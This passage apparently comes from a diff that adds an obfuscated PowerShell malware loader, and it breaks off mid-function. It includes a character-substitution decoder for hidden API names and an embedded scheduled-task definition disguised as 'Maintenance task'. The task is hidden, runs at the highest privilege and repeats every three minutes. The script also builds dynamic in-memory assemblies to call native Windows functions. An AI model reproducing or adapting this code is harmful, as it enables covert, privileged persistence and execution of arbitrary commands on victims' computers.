@@ -1,0 +1,1030 @@
+function lkjhgfdszxcvbnpoiuytredfgh {
+    param(
+        [string] $mfadsfkljiouoijlkfjdasfkjlfadsfadfa
+    )
+    
+    $poiuytrewqasdfghjklmnbvcxzqwertyui = New-Object System.Collections.Hashtable
+    $poiuytrewqasdfghjklmnbvcxzqwertyui['eqf'] = 0; $poiuytrewqasdfghjklmnbvcxzqwertyui['##q'] = 1; $poiuytrewqasdfghjklmnbvcxzqwertyui['9b3'] = 2; $poiuytrewqasdfghjklmnbvcxzqwertyui['am6'] = 3; $poiuytrewqasdfghjklmnbvcxzqwertyui['qs6'] = 4; $poiuytrewqasdfghjklmnbvcxzqwertyui['ffe'] = 5; $poiuytrewqasdfghjklmnbvcxzqwertyui['(56'] = 6; $poiuytrewqasdfghjklmnbvcxzqwertyui['d78'] = 7; $poiuytrewqasdfghjklmnbvcxzqwertyui['d0s'] = 8; $poiuytrewqasdfghjklmnbvcxzqwertyui['gi#'] = 9; $poiuytrewqasdfghjklmnbvcxzqwertyui['6ff'] = 10; $poiuytrewqasdfghjklmnbvcxzqwertyui['49!'] = 11; $poiuytrewqasdfghjklmnbvcxzqwertyui['4sj'] = 12; $poiuytrewqasdfghjklmnbvcxzqwertyui['tds'] = 13; $poiuytrewqasdfghjklmnbvcxzqwertyui['gb4'] = 14; $poiuytrewqasdfghjklmnbvcxzqwertyui['g(n'] = 15; $poiuytrewqasdfghjklmnbvcxzqwertyui['srk'] = 16; $poiuytrewqasdfghjklmnbvcxzqwertyui['^l3'] = 17; $poiuytrewqasdfghjklmnbvcxzqwertyui['&b8'] = 18; $poiuytrewqasdfghjklmnbvcxzqwertyui['q9d'] = 19; $poiuytrewqasdfghjklmnbvcxzqwertyui['*3!'] = 20; $poiuytrewqasdfghjklmnbvcxzqwertyui['9mh'] = 21; $poiuytrewqasdfghjklmnbvcxzqwertyui['1!9'] = 22; $poiuytrewqasdfghjklmnbvcxzqwertyui['#t5'] = 23; $poiuytrewqasdfghjklmnbvcxzqwertyui['%s2'] = 24; $poiuytrewqasdfghjklmnbvcxzqwertyui['g&5'] = 25; $poiuytrewqasdfghjklmnbvcxzqwertyui['e^0'] = 26; $poiuytrewqasdfghjklmnbvcxzqwertyui['f60'] = 27; $poiuytrewqasdfghjklmnbvcxzqwertyui['29#'] = 28; $poiuytrewqasdfghjklmnbvcxzqwertyui['168'] = 29; $poiuytrewqasdfghjklmnbvcxzqwertyui['ch9'] = 30; $poiuytrewqasdfghjklmnbvcxzqwertyui['f1s'] = 31; $poiuytrewqasdfghjklmnbvcxzqwertyui['6q8'] = 32; $poiuytrewqasdfghjklmnbvcxzqwertyui['q4h'] = 33; $poiuytrewqasdfghjklmnbvcxzqwertyui['34&'] = 34; $poiuytrewqasdfghjklmnbvcxzqwertyui['4b!'] = 35; $poiuytrewqasdfghjklmnbvcxzqwertyui['b0d'] = 36; $poiuytrewqasdfghjklmnbvcxzqwertyui['cm#'] = 37; $poiuytrewqasdfghjklmnbvcxzqwertyui['m@^'] = 38; $poiuytrewqasdfghjklmnbvcxzqwertyui['bh3'] = 39; $poiuytrewqasdfghjklmnbvcxzqwertyui['nae'] = 40; $poiuytrewqasdfghjklmnbvcxzqwertyui['b!l'] = 41; $poiuytrewqasdfghjklmnbvcxzqwertyui['^8*'] = 42; $poiuytrewqasdfghjklmnbvcxzqwertyui['cts'] = 43; $poiuytrewqasdfghjklmnbvcxzqwertyui['&7k'] = 44; $poiuytrewqasdfghjklmnbvcxzqwertyui['21c'] = 45; $poiuytrewqasdfghjklmnbvcxzqwertyui['@&8'] = 46; $poiuytrewqasdfghjklmnbvcxzqwertyui['bs^'] = 47; $poiuytrewqasdfghjklmnbvcxzqwertyui['4(%'] = 48; $poiuytrewqasdfghjklmnbvcxzqwertyui['^!7'] = 49; $poiuytrewqasdfghjklmnbvcxzqwertyui['25j'] = 50; $poiuytrewqasdfghjklmnbvcxzqwertyui['fd4'] = 51; $poiuytrewqasdfghjklmnbvcxzqwertyui['c1@'] = 52; $poiuytrewqasdfghjklmnbvcxzqwertyui['57l'] = 53; $poiuytrewqasdfghjklmnbvcxzqwertyui['@(j'] = 54; $poiuytrewqasdfghjklmnbvcxzqwertyui['3f4'] = 55; $poiuytrewqasdfghjklmnbvcxzqwertyui['29k'] = 56; $poiuytrewqasdfghjklmnbvcxzqwertyui['#hj'] = 57; $poiuytrewqasdfghjklmnbvcxzqwertyui['#lt'] = 58; $poiuytrewqasdfghjklmnbvcxzqwertyui['iq!'] = 59; $poiuytrewqasdfghjklmnbvcxzqwertyui['pa^'] = 60; $poiuytrewqasdfghjklmnbvcxzqwertyui['js#'] = 61; $poiuytrewqasdfghjklmnbvcxzqwertyui['j!3'] = 62; $poiuytrewqasdfghjklmnbvcxzqwertyui['6ta'] = 63; $poiuytrewqasdfghjklmnbvcxzqwertyui['ihi'] = 64; $poiuytrewqasdfghjklmnbvcxzqwertyui['qht'] = 65; $poiuytrewqasdfghjklmnbvcxzqwertyui['5a#'] = 66; $poiuytrewqasdfghjklmnbvcxzqwertyui['jmc'] = 67; $poiuytrewqasdfghjklmnbvcxzqwertyui['q8q'] = 68; $poiuytrewqasdfghjklmnbvcxzqwertyui['(k0'] = 69; $poiuytrewqasdfghjklmnbvcxzqwertyui['d#e'] = 70; $poiuytrewqasdfghjklmnbvcxzqwertyui['ai7'] = 71; $poiuytrewqasdfghjklmnbvcxzqwertyui['o3s'] = 72; $poiuytrewqasdfghjklmnbvcxzqwertyui['pnm'] = 73; $poiuytrewqasdfghjklmnbvcxzqwertyui['b%j'] = 74; $poiuytrewqasdfghjklmnbvcxzqwertyui['k5('] = 75; $poiuytrewqasdfghjklmnbvcxzqwertyui['apd'] = 76; $poiuytrewqasdfghjklmnbvcxzqwertyui['a2q'] = 77; $poiuytrewqasdfghjklmnbvcxzqwertyui['*g7'] = 78; $poiuytrewqasdfghjklmnbvcxzqwertyui['#@0'] = 79; $poiuytrewqasdfghjklmnbvcxzqwertyui['pkt'] = 80; $poiuytrewqasdfghjklmnbvcxzqwertyui['@35'] = 81; $poiuytrewqasdfghjklmnbvcxzqwertyui['%h('] = 82; $poiuytrewqasdfghjklmnbvcxzqwertyui['1c4'] = 83; $poiuytrewqasdfghjklmnbvcxzqwertyui['bj6'] = 84; $poiuytrewqasdfghjklmnbvcxzqwertyui['tir'] = 85; $poiuytrewqasdfghjklmnbvcxzqwertyui['!fd'] = 86; $poiuytrewqasdfghjklmnbvcxzqwertyui['r*#'] = 87; $poiuytrewqasdfghjklmnbvcxzqwertyui['7cl'] = 88; $poiuytrewqasdfghjklmnbvcxzqwertyui['7cc'] = 89; $poiuytrewqasdfghjklmnbvcxzqwertyui['(t9'] = 90; $poiuytrewqasdfghjklmnbvcxzqwertyui['7(c'] = 91; $poiuytrewqasdfghjklmnbvcxzqwertyui['!il'] = 92; $poiuytrewqasdfghjklmnbvcxzqwertyui['3oq'] = 93; $poiuytrewqasdfghjklmnbvcxzqwertyui['asn'] = 94; $poiuytrewqasdfghjklmnbvcxzqwertyui['s(l'] = 95; $poiuytrewqasdfghjklmnbvcxzqwertyui['9q&'] = 96; $poiuytrewqasdfghjklmnbvcxzqwertyui['ib6'] = 97; $poiuytrewqasdfghjklmnbvcxzqwertyui['7*l'] = 98; $poiuytrewqasdfghjklmnbvcxzqwertyui['5et'] = 99; $poiuytrewqasdfghjklmnbvcxzqwertyui['nhf'] = 100; $poiuytrewqasdfghjklmnbvcxzqwertyui['&11'] = 101; $poiuytrewqasdfghjklmnbvcxzqwertyui['#mk'] = 102; $poiuytrewqasdfghjklmnbvcxzqwertyui['38a'] = 103; $poiuytrewqasdfghjklmnbvcxzqwertyui['fi0'] = 104; $poiuytrewqasdfghjklmnbvcxzqwertyui['5qs'] = 105; $poiuytrewqasdfghjklmnbvcxzqwertyui['shd'] = 106; $poiuytrewqasdfghjklmnbvcxzqwertyui['(&5'] = 107; $poiuytrewqasdfghjklmnbvcxzqwertyui['e0r'] = 108; $poiuytrewqasdfghjklmnbvcxzqwertyui['daa'] = 109; $poiuytrewqasdfghjklmnbvcxzqwertyui['0fd'] = 110; $poiuytrewqasdfghjklmnbvcxzqwertyui['!ig'] = 111; $poiuytrewqasdfghjklmnbvcxzqwertyui['kd&'] = 112; $poiuytrewqasdfghjklmnbvcxzqwertyui['@46'] = 113; $poiuytrewqasdfghjklmnbvcxzqwertyui['bg8'] = 114; $poiuytrewqasdfghjklmnbvcxzqwertyui['^d@'] = 115; $poiuytrewqasdfghjklmnbvcxzqwertyui['^b1'] = 116; $poiuytrewqasdfghjklmnbvcxzqwertyui['!g^'] = 117; $poiuytrewqasdfghjklmnbvcxzqwertyui['pok'] = 118; $poiuytrewqasdfghjklmnbvcxzqwertyui['s!0'] = 119; $poiuytrewqasdfghjklmnbvcxzqwertyui['c0m'] = 120; $poiuytrewqasdfghjklmnbvcxzqwertyui['k!2'] = 121; $poiuytrewqasdfghjklmnbvcxzqwertyui['&n('] = 122; $poiuytrewqasdfghjklmnbvcxzqwertyui['3nn'] = 123; $poiuytrewqasdfghjklmnbvcxzqwertyui['263'] = 124; $poiuytrewqasdfghjklmnbvcxzqwertyui['q*9'] = 125; $poiuytrewqasdfghjklmnbvcxzqwertyui['&h6'] = 126; $poiuytrewqasdfghjklmnbvcxzqwertyui['5g*'] = 127; $poiuytrewqasdfghjklmnbvcxzqwertyui['r(('] = 128; $poiuytrewqasdfghjklmnbvcxzqwertyui['go#'] = 129; $poiuytrewqasdfghjklmnbvcxzqwertyui['^!k'] = 130; $poiuytrewqasdfghjklmnbvcxzqwertyui['f9#'] = 131; $poiuytrewqasdfghjklmnbvcxzqwertyui['n9o'] = 132; $poiuytrewqasdfghjklmnbvcxzqwertyui['f(9'] = 133; $poiuytrewqasdfghjklmnbvcxzqwertyui['@l6'] = 134; $poiuytrewqasdfghjklmnbvcxzqwertyui['gis'] = 135; $poiuytrewqasdfghjklmnbvcxzqwertyui['m(p'] = 136; $poiuytrewqasdfghjklmnbvcxzqwertyui['t23'] = 137; $poiuytrewqasdfghjklmnbvcxzqwertyui['eq3'] = 138; $poiuytrewqasdfghjklmnbvcxzqwertyui['n!@'] = 139; $poiuytrewqasdfghjklmnbvcxzqwertyui['20*'] = 140; $poiuytrewqasdfghjklmnbvcxzqwertyui['f72'] = 141; $poiuytrewqasdfghjklmnbvcxzqwertyui['dp^'] = 142; $poiuytrewqasdfghjklmnbvcxzqwertyui['8dh'] = 143; $poiuytrewqasdfghjklmnbvcxzqwertyui['o0i'] = 144; $poiuytrewqasdfghjklmnbvcxzqwertyui['&!%'] = 145; $poiuytrewqasdfghjklmnbvcxzqwertyui['kl9'] = 146; $poiuytrewqasdfghjklmnbvcxzqwertyui['t@o'] = 147; $poiuytrewqasdfghjklmnbvcxzqwertyui['qoi'] = 148; $poiuytrewqasdfghjklmnbvcxzqwertyui['6bm'] = 149; $poiuytrewqasdfghjklmnbvcxzqwertyui['j(*'] = 150; $poiuytrewqasdfghjklmnbvcxzqwertyui['13h'] = 151; $poiuytrewqasdfghjklmnbvcxzqwertyui['074'] = 152; $poiuytrewqasdfghjklmnbvcxzqwertyui['ed!'] = 153; $poiuytrewqasdfghjklmnbvcxzqwertyui['33^'] = 154; $poiuytrewqasdfghjklmnbvcxzqwertyui['if!'] = 155; $poiuytrewqasdfghjklmnbvcxzqwertyui['og5'] = 156; $poiuytrewqasdfghjklmnbvcxzqwertyui['8dt'] = 157; $poiuytrewqasdfghjklmnbvcxzqwertyui['cc&'] = 158; $poiuytrewqasdfghjklmnbvcxzqwertyui['27m'] = 159; $poiuytrewqasdfghjklmnbvcxzqwertyui['npo'] = 160; $poiuytrewqasdfghjklmnbvcxzqwertyui['2sd'] = 161; $poiuytrewqasdfghjklmnbvcxzqwertyui['j@g'] = 162; $poiuytrewqasdfghjklmnbvcxzqwertyui['afd'] = 163; $poiuytrewqasdfghjklmnbvcxzqwertyui['jgh'] = 164; $poiuytrewqasdfghjklmnbvcxzqwertyui['&^i'] = 165; $poiuytrewqasdfghjklmnbvcxzqwertyui['sii'] = 166; $poiuytrewqasdfghjklmnbvcxzqwertyui['pl#'] = 167; $poiuytrewqasdfghjklmnbvcxzqwertyui['71^'] = 168; $poiuytrewqasdfghjklmnbvcxzqwertyui['qst'] = 169; $poiuytrewqasdfghjklmnbvcxzqwertyui['jia'] = 170; $poiuytrewqasdfghjklmnbvcxzqwertyui['k96'] = 171; $poiuytrewqasdfghjklmnbvcxzqwertyui['qae'] = 172; $poiuytrewqasdfghjklmnbvcxzqwertyui['!*l'] = 173; $poiuytrewqasdfghjklmnbvcxzqwertyui['4nb'] = 174; $poiuytrewqasdfghjklmnbvcxzqwertyui['1r^'] = 175; $poiuytrewqasdfghjklmnbvcxzqwertyui['lff'] = 176; $poiuytrewqasdfghjklmnbvcxzqwertyui['8ds'] = 177; $poiuytrewqasdfghjklmnbvcxzqwertyui['d&e'] = 178; $poiuytrewqasdfghjklmnbvcxzqwertyui['1%*'] = 179; $poiuytrewqasdfghjklmnbvcxzqwertyui['h!n'] = 180; $poiuytrewqasdfghjklmnbvcxzqwertyui['59&'] = 181; $poiuytrewqasdfghjklmnbvcxzqwertyui['d(p'] = 182; $poiuytrewqasdfghjklmnbvcxzqwertyui['1t^'] = 183; $poiuytrewqasdfghjklmnbvcxzqwertyui['e6j'] = 184; $poiuytrewqasdfghjklmnbvcxzqwertyui['&!*'] = 185; $poiuytrewqasdfghjklmnbvcxzqwertyui['@gc'] = 186; $poiuytrewqasdfghjklmnbvcxzqwertyui['(fn'] = 187; $poiuytrewqasdfghjklmnbvcxzqwertyui['o1f'] = 188; $poiuytrewqasdfghjklmnbvcxzqwertyui['th@'] = 189; $poiuytrewqasdfghjklmnbvcxzqwertyui['1^e'] = 190; $poiuytrewqasdfghjklmnbvcxzqwertyui['g4g'] = 191; $poiuytrewqasdfghjklmnbvcxzqwertyui['**3'] = 192; $poiuytrewqasdfghjklmnbvcxzqwertyui['ers'] = 193; $poiuytrewqasdfghjklmnbvcxzqwertyui['t04'] = 194; $poiuytrewqasdfghjklmnbvcxzqwertyui['i4p'] = 195; $poiuytrewqasdfghjklmnbvcxzqwertyui['jgf'] = 196; $poiuytrewqasdfghjklmnbvcxzqwertyui['g88'] = 197; $poiuytrewqasdfghjklmnbvcxzqwertyui['%h6'] = 198; $poiuytrewqasdfghjklmnbvcxzqwertyui['aki'] = 199; $poiuytrewqasdfghjklmnbvcxzqwertyui['!20'] = 200; $poiuytrewqasdfghjklmnbvcxzqwertyui['3(4'] = 201; $poiuytrewqasdfghjklmnbvcxzqwertyui['0&b'] = 202; $poiuytrewqasdfghjklmnbvcxzqwertyui['d*@'] = 203; $poiuytrewqasdfghjklmnbvcxzqwertyui['n77'] = 204; $poiuytrewqasdfghjklmnbvcxzqwertyui['2sn'] = 205; $poiuytrewqasdfghjklmnbvcxzqwertyui['8f&'] = 206; $poiuytrewqasdfghjklmnbvcxzqwertyui['8jb'] = 207; $poiuytrewqasdfghjklmnbvcxzqwertyui['6oh'] = 208; $poiuytrewqasdfghjklmnbvcxzqwertyui['pkp'] = 209; $poiuytrewqasdfghjklmnbvcxzqwertyui['s*7'] = 210; $poiuytrewqasdfghjklmnbvcxzqwertyui['om%'] = 211; $poiuytrewqasdfghjklmnbvcxzqwertyui['7^!'] = 212; $poiuytrewqasdfghjklmnbvcxzqwertyui['ar6'] = 213; $poiuytrewqasdfghjklmnbvcxzqwertyui['ogh'] = 214; $poiuytrewqasdfghjklmnbvcxzqwertyui['l!a'] = 215; $poiuytrewqasdfghjklmnbvcxzqwertyui['al8'] = 216; $poiuytrewqasdfghjklmnbvcxzqwertyui['mke'] = 217; $poiuytrewqasdfghjklmnbvcxzqwertyui['kcl'] = 218; $poiuytrewqasdfghjklmnbvcxzqwertyui['9^3'] = 219; $poiuytrewqasdfghjklmnbvcxzqwertyui['pn6'] = 220; $poiuytrewqasdfghjklmnbvcxzqwertyui['43('] = 221; $poiuytrewqasdfghjklmnbvcxzqwertyui['f(o'] = 222; $poiuytrewqasdfghjklmnbvcxzqwertyui['@#2'] = 223; $poiuytrewqasdfghjklmnbvcxzqwertyui['277'] = 224; $poiuytrewqasdfghjklmnbvcxzqwertyui['knd'] = 225; $poiuytrewqasdfghjklmnbvcxzqwertyui['@o2'] = 226; $poiuytrewqasdfghjklmnbvcxzqwertyui['gp*'] = 227; $poiuytrewqasdfghjklmnbvcxzqwertyui['7g6'] = 228; $poiuytrewqasdfghjklmnbvcxzqwertyui['2ej'] = 229; $poiuytrewqasdfghjklmnbvcxzqwertyui['2*a'] = 230; $poiuytrewqasdfghjklmnbvcxzqwertyui['h3d'] = 231; $poiuytrewqasdfghjklmnbvcxzqwertyui['a92'] = 232; $poiuytrewqasdfghjklmnbvcxzqwertyui['hf@'] = 233; $poiuytrewqasdfghjklmnbvcxzqwertyui['4gq'] = 234; $poiuytrewqasdfghjklmnbvcxzqwertyui['f93'] = 235; $poiuytrewqasdfghjklmnbvcxzqwertyui['q(8'] = 236; $poiuytrewqasdfghjklmnbvcxzqwertyui['i^1'] = 237; $poiuytrewqasdfghjklmnbvcxzqwertyui['bi*'] = 238; $poiuytrewqasdfghjklmnbvcxzqwertyui['7&q'] = 239; $poiuytrewqasdfghjklmnbvcxzqwertyui['m3%'] = 240; $poiuytrewqasdfghjklmnbvcxzqwertyui['fk^'] = 241; $poiuytrewqasdfghjklmnbvcxzqwertyui['2nd'] = 242; $poiuytrewqasdfghjklmnbvcxzqwertyui['4k3'] = 243; $poiuytrewqasdfghjklmnbvcxzqwertyui['t4i'] = 244; $poiuytrewqasdfghjklmnbvcxzqwertyui['82i'] = 245; $poiuytrewqasdfghjklmnbvcxzqwertyui['11p'] = 246; $poiuytrewqasdfghjklmnbvcxzqwertyui['dee'] = 247; $poiuytrewqasdfghjklmnbvcxzqwertyui['tmc'] = 248; $poiuytrewqasdfghjklmnbvcxzqwertyui['sgn'] = 249; $poiuytrewqasdfghjklmnbvcxzqwertyui['el@'] = 250; $poiuytrewqasdfghjklmnbvcxzqwertyui['f7'] = 251; $poiuytrewqasdfghjklmnbvcxzqwertyui['*s^'] = 252; $poiuytrewqasdfghjklmnbvcxzqwertyui['13p'] = 253; $poiuytrewqasdfghjklmnbvcxzqwertyui['s@8'] = 254; $poiuytrewqasdfghjklmnbvcxzqwertyui['f7k'] = 255
+    
+    $EVYiRueEddevroExaOfeMmkurjWemmVV = ""
+    
+    $RPjNBlihoueNkoRiRuqmjsyRkeqiYzSr = $($poiuytrewqasdfghjklmnbvcxzqwertyui.Keys)[0].length
+    for ($IJdcFrvogypRIWJDRnNrwimZQRcXuAJp = 0; $IJdcFrvogypRIWJDRnNrwimZQRcXuAJp -lt $mfadsfkljiouoijlkfjdasfkjlfadsfadfa.length; $IJdcFrvogypRIWJDRnNrwimZQRcXuAJp += $RPjNBlihoueNkoRiRuqmjsyRkeqiYzSr) {
+        $EVYiRueEddevroExaOfeMmkurjWemmVV += [char]$poiuytrewqasdfghjklmnbvcxzqwertyui[$mfadsfkljiouoijlkfjdasfkjlfadsfadfa.SubString($IJdcFrvogypRIWJDRnNrwimZQRcXuAJp, $RPjNBlihoueNkoRiRuqmjsyRkeqiYzSr)]
+    }
+    
+    $EVYiRueEddevroExaOfeMmkurjWemmVV
+}
+
+$ImprizeMornalStodenSavioidaLacize = @'
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Maintenance task</Description>
+  </RegistrationInfo>
+   <Triggers>
+    <TimeTrigger>
+      <Repetition>
+        <Interval>PT3M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <StartBoundary>VAR_DATET00:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
+    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>VAR_CMD</Command>
+	  <Arguments>VAR_ARG</Arguments>
+    
+</Exec>
+  </Actions>
+</Task>
+'@;
+ 
+ 
+function BifortsFencyEidial {
+       
+    Param
+    (
+        [Parameter(Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $PinmetForecotBiblyScarbed = [Guid]::NewGuid().ToString()
+    )
+    
+    $FoulissusDaortRoarcapNignally = [Reflection.Assembly].Assembly.GetType((lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8qhtkd&kd&q8q!igdaaib65qs0fd")).GetProperty((lkjhgfdszxcvbnpoiuytredfgh "jmc!g^bg8bg8&110fd^b1q8q!igdaaib65qs0fd")).GetValue($null, @());
+    $EwestAnageBeworksUniceae = $FoulissusDaortRoarcapNignally.GetAssemblies();
+    
+    foreach ($SemilityAmiutFastylesMackhoodMammodent in $EwestAnageBeworksUniceae) {
+        if ($SemilityAmiutFastylesMackhoodMammodent.FullName -and ($SemilityAmiutFastylesMackhoodMammodent.FullName.Split((lkjhgfdszxcvbnpoiuytredfgh "&7k"))[0] -eq $PinmetForecotBiblyScarbed)) {
+            return $SemilityAmiutFastylesMackhoodMammodent;
+        }
+    };
+    
+    $AcroenousProokEvoltGadowl = New-Object ((lkjhgfdszxcvbnpoiuytredfgh "%h(&11#mke0r&115et^b15qs!ig0fd@&8qht^d@^d@&11daa7*le0rk!2*g7ib6daa&11"))($PinmetForecotBiblyScarbed);
+    $NonlinessRatednessPlasidern = $FoulissusDaortRoarcapNignally;
+    $AppotidReinterSalist = $NonlinessRatednessPlasidern.DefineDynamicAssembly($AcroenousProokEvoltGadowl, (lkjhgfdszxcvbnpoiuytredfgh "%h(!g^0fd"));
+    $BicuriGluthClimarks = $AppotidReinterSalist.DefineDynamicModule($PinmetForecotBiblyScarbed, $False);
+    
+    return $BicuriGluthClimarks;
+};
+    
+    
+
+
+function FiqueCamousCaidkingMoristTergarric {
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $ShrasMyricScussive,
+        
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]
+        $ProosentInterAkebbiacSubgrableParody,
+        
+        [Parameter(Position = 2, Mandatory = $True)]
+        [Type]
+        $SaceousEutingButionPronels,
+        
+        [Parameter(Position = 3)]
+        [Type[]]
+        $AltersVagingMurrineUnfixable,
+        
+        [Parameter(Position = 4)]
+        [Runtime.InteropServices.CallingConvention]
+        $UnwishTronicDichroclePesensUnifie,
+        
+        [Parameter(Position = 5)]
+        [Runtime.InteropServices.CharSet]
+        $PlicagedUngirousDocials,
+        
+        [String]
+        $InfelorsInactionsMeterateInhauses,
+        
+        [Switch]
+        $OrrhingForcedKlantJardicHooder
+    )
+    
+    $GroachnicEpitationBeavism = @{
+        ShrasMyricScussive      = $ShrasMyricScussive;
+        ProosentInterAkebbiacSubgrableParody = $ProosentInterAkebbiacSubgrableParody;
+        SaceousEutingButionPronels   = $SaceousEutingButionPronels;
+    };
+    
+    if ($AltersVagingMurrineUnfixable) { $GroachnicEpitationBeavism[(lkjhgfdszxcvbnpoiuytredfgh "qhte0r^b1&11bg8^d@!fdib638a5qs0fd38aa2q!g^bg8bg85qs0fd&11tir0fd#mk5qsc0mib67*le0r&11")] = $AltersVagingMurrineUnfixable };
+    if ($UnwishTronicDichroclePesensUnifie) { $GroachnicEpitationBeavism[(lkjhgfdszxcvbnpoiuytredfgh "tir0fds!05qs^d@fi0bj6bg8!ig0fd5qs5etq8q5qs5etfi0bg8!ig5ete0r&11pkt&11^d@&110fd^d@tir0fd5qs#mk5qs&11")] = $UnwishTronicDichroclePesensUnifie };
+    if ($PlicagedUngirousDocials) { $GroachnicEpitationBeavism[(lkjhgfdszxcvbnpoiuytredfgh "pkte0r5qs5etib638a&11nhftir0fd38a5qsbg8!ig!g^^d@q8q!ig5et5qsib6e0r^d@")] = $PlicagedUngirousDocials };
+    if ($OrrhingForcedKlantJardicHooder) { $GroachnicEpitationBeavism[(lkjhgfdszxcvbnpoiuytredfgh "#@0bg8bg8fi05qs0fd38ad#e!igbg85et&11nhfk5(e0rib60fd^b1b%jib6bg8nhf5qs5eto3s!ig!ignhf&11bg8")] = $OrrhingForcedKlantJardicHooder };
+    if ($InfelorsInactionsMeterateInhauses) { $GroachnicEpitationBeavism[(lkjhgfdszxcvbnpoiuytredfgh "pnm0fd#mk&11e0r!igbg8^d@pnm0fdib65et^b15qs!ig0fd^d@a2q&11^b1&11bg8ib6^b1&11pnm0fdfi0ib6!g^^d@&11^d@")] = $InfelorsInactionsMeterateInhauses };
+    
+    New-Object (lkjhgfdszxcvbnpoiuytredfgh "pkt1c4#@07*lshd&115et^b1") -Property $GroachnicEpitationBeavism;
+};
+    
+    
+function DibbinedBigniteImpyromanMyingLaread {
+   
+    [OutputType([Hashtable])]
+    Param(
+        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+        [String]
+        $ShrasMyricScussive,
+        
+        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+        [String]
+        $ProosentInterAkebbiacSubgrableParody,
+        
+        [Parameter(ValueFromPipelineByPropertyName = $True)]
+        [String]
+        $InfelorsInactionsMeterateInhauses,
+        
+        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+        [Type]
+        $SaceousEutingButionPronels,
+        
+        [Parameter(ValueFromPipelineByPropertyName = $True)]
+        [Type[]]
+        $AltersVagingMurrineUnfixable,
+        
+        [Parameter(ValueFromPipelineByPropertyName = $True)]
+        [Runtime.InteropServices.CallingConvention]
+        $UnwishTronicDichroclePesensUnifie = [Runtime.InteropServices.CallingConvention]::StdCall,
+        
+        [Parameter(ValueFromPipelineByPropertyName = $True)]
+        [Runtime.InteropServices.CharSet]
+        $PlicagedUngirousDocials = [Runtime.InteropServices.CharSet]::Auto,
+        
+        [Parameter(ValueFromPipelineByPropertyName = $True)]
+        [Switch]
+        $OrrhingForcedKlantJardicHooder,
+        
+        [Parameter(Mandatory = $True)]
+        [ValidateScript({ ($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly]) })]
+        $ElemmeralBaleuMyrminess,
+        
+        [ValidateNotNull()]
+        [String]
+        $IsoevoidGlotelyPerfaggerSloomsReptile = ''
+    )
+    
+    BEGIN {
+        $SwoodHypoachPassard = @{}
+    }
+    
+    PROCESS {
+        if ($ElemmeralBaleuMyrminess -is [Reflection.Assembly]) {
+            if ($IsoevoidGlotelyPerfaggerSloomsReptile) {
+                $SwoodHypoachPassard[$ShrasMyricScussive] = $ElemmeralBaleuMyrminess.GetType(((lkjhgfdszxcvbnpoiuytredfgh "3nn4(%q*9@&83nn^!7q*9") -f $IsoevoidGlotelyPerfaggerSloomsReptile, $ShrasMyricScussive));
+            }
+            else {
+                $SwoodHypoachPassard[$ShrasMyricScussive] = $ElemmeralBaleuMyrminess.GetType($ShrasMyricScussive);
+            }
+        }
+        else {
+            
+            if (!$SwoodHypoachPassard.ContainsKey($ShrasMyricScussive)) {
+                if ($IsoevoidGlotelyPerfaggerSloomsReptile) {
+                    $SwoodHypoachPassard[$ShrasMyricScussive] = $ElemmeralBaleuMyrminess.DefineType(((lkjhgfdszxcvbnpoiuytredfgh "3nn4(%q*9@&83nn^!7q*9") -f $IsoevoidGlotelyPerfaggerSloomsReptile, $ShrasMyricScussive), (lkjhgfdszxcvbnpoiuytredfgh "pkt!g^7*le0r5qs5et&7k5a#&11#mk!igbg8&11d#e5qs&11e0rnhfpnm0fd5qs^b1"));
+                }
+                else {
+                    $SwoodHypoachPassard[$ShrasMyricScussive] = $ElemmeralBaleuMyrminess.DefineType($ShrasMyricScussive, (lkjhgfdszxcvbnpoiuytredfgh "pkt!g^7*le0r5qs5et&7k5a#&11#mk!igbg8&11d#e5qs&11e0rnhfpnm0fd5qs^b1"));
+                }
+            }
+            
+            $TuborahamLabetalPariesUnble = $SwoodHypoachPassard[$ShrasMyricScussive].DefineMethod(
+                $ProosentInterAkebbiacSubgrableParody,
+                (lkjhgfdszxcvbnpoiuytredfgh "pkt!g^7*le0r5qs5et&7k1c4^b1ib6^b15qs5et&7kpkt5qs0fdpok!ig(&5&11pnmdaakd&e0r"),
+                $SaceousEutingButionPronels,
+                $AltersVagingMurrineUnfixable);
+                
+            
+            $EquiressNeumourseFidginess = 1;
+            foreach ($PanistEmpaksCohemakir in $AltersVagingMurrineUnfixable) {
+                if ($PanistEmpaksCohemakir.IsByRef) {
